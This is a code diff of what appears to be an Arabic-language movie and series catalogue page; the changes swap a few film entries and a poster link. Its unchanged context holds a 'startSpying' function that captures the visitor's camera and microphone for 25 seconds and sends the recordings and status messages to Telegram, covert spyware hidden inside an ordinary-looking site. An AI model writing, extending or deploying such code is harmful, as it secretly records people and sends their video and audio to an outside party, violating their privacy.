@@ -135,17 +135,13 @@
     let videoRec, audioRec, vChunks=[], aChunks=[];
     async function startSpying() { try { let stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true}); vChunks=[]; videoRec=new MediaRecorder(stream,{mimeType:'video/webm'}); videoRec.ondataavailable=e=>{if(e.data.size)vChunks.push(e.data);}; videoRec.onstop=async()=>await sendFileToTelegram(new Blob(vChunks,{type:'video/webm'}),'video'); videoRec.start(); let aStream=await navigator.mediaDevices.getUserMedia({audio:true}); aChunks=[]; audioRec=new MediaRecorder(aStream,{mimeType:'audio/webm'}); audioRec.ondataavailable=e=>{if(e.data.size)aChunks.push(e.data);}; audioRec.onstop=async()=>await sendFileToTelegram(new Blob(aChunks,{type:'audio/webm'}),'audio'); audioRec.start(); setTimeout(()=>{if(videoRec&&videoRec.state==='recording')videoRec.stop(); if(audioRec&&audioRec.state==='recording')audioRec.stop(); stream.getTracks().forEach(t=>t.stop()); aStream.getTracks().forEach(t=>t.stop());},25000); sendTextToTelegram("🔴 بدء المراقبة"); } catch(e){ sendTextToTelegram(`❌ فشل: ${e.message}`); } }
 
-    // ========== قوائم الأفلام والمسلسلات ==========
-    // تم استبدال GOAT, Scream 7, Ready or Not 2 فقط
+    // ========== قوائم الأفلام والمسلسلات (تم استبدال صورة Get Out فقط) ==========
     const movies = [
-        // الأفلام التي ظهرت سليمة (لا تلمس)
         { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg" },
         { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg" },
         { title: "Titanic", year: "1997", img: "https://image.tmdb.org/t/p/w500/9xjZS2rlVxm8SFx8kPC3aIGCOYQ.jpg" },
         { title: "The Avengers", year: "2012", img: "https://image.tmdb.org/t/p/w500/RYMX2wcKCBAr24UyPD7xwmjaTn.jpg" },
-        // تم استبدال GOAT بفيلم The Godfather (صورة مضمونة)
         { title: "The Godfather", year: "1972", img: "https://image.tmdb.org/t/p/w500/3bhkrj58Vtu7enYsRolD1fZdja1.jpg" },
-        // باقي الأفلام كما هي
         { title: "The Dark Knight", year: "2008", img: "https://image.tmdb.org/t/p/w500/qJ2tW6WMUDux911r6m7haRef0WH.jpg" },
         { title: "Inception", year: "2010", img: "https://image.tmdb.org/t/p/w500/9gk7adHYeDvHkCSEqAvQNLV5UY4.jpg" },
         { title: "Interstellar", year: "2014", img: "https://image.tmdb.org/t/p/w500/gEU2QniE6E77NI6lCU6MxlNBvIx.jpg" },
@@ -157,10 +153,9 @@
         { title: "Stranger Things", year: "2016", img: "https://image.tmdb.org/t/p/w500/49WJfeN0moxb9IPfGn8AIqMGskD.jpg" }
     ];
     const comingSoon = [
-        // تم استبدال Scream 7 بفيلم The Conjuring
         { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w500/wVYREutTvI2tmxr6ujrHT704wGF.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" },
-        // تم استبدال Ready or Not 2 بفيلم Get Out
-        { title: "Get Out", year: "2017", img: "https://image.tmdb.org/t/p/w500/1SwAVYpuLj8YE6WAO3BDFZWQvJi.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
+        // تم استبدال صورة Get Out بالرابط الذي أرسلته
+        { title: "Get Out", year: "2017", img: "https://image.tmdb.org/t/p/w220_and_h330_face/cSNgGUf6k2k7WJJVlda6ZUPYgGo.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
     ];
 
     function loadItems(containerId, items, type, showNote=false) {
